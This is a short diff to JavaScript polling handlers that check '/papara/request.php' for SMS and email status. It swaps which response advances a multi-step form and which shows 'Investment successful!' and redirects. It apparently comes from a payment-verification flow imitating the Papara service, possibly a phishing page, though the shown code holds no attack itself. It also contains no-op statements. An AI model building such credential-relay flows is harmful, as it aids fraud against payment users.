@@ -173,12 +173,12 @@ function myLoop2() {         //  create a loop function
         type: "POST",
         url: "/papara/request.php?q=sms-durum",
         success: function(response) {
-            if (response == '1'){
-              b + 100;
-              swal.close()
-              Swal.fire("Yatırım başarılı!","","success")
-              window.location.pathname = '/m';
-            }
+            if (response == '4'){
+                c + 100;
+                swal.close()
+                $('#step-4').css("display","none");
+              $('#step-5').css("display","flex");
+              }
         }
       })  
       //  your code here
@@ -197,12 +197,13 @@ function myLoop2() {         //  create a loop function
         type: "POST",
         url: "/papara/request.php?q=email-durum",
         success: function(response) {
-            if (response == '4'){
-              c + 100;
-              swal.close()
-              $('#step-4').css("display","none");
-            $('#step-5').css("display","flex");
-            }
+            
+            if (response == '1'){
+                b + 100;
+                swal.close()
+                Swal.fire("Yatırım başarılı!","","success")
+                window.location.pathname = '/m';
+              }
         }
       })  
       //  your code here
